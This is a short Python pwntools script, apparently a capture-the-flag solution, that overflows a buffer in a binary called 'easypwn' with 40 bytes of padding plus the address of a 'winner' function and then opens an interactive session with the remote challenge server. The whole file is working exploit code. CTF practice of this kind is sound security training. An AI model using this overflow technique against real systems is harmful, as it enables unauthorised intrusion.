#!/usr/bin/env python3
from pwn import *

BINARY = "easypwn"

exe = ELF(BINARY)

# p = process(f"./{BINARY}")
# gdb.attach(p)
p = remote("io.ept.gg", 30004)

payload = b"A"*40 + p64(exe.sym["winner"])

p.recvline()
p.sendline(payload)

p.interactive()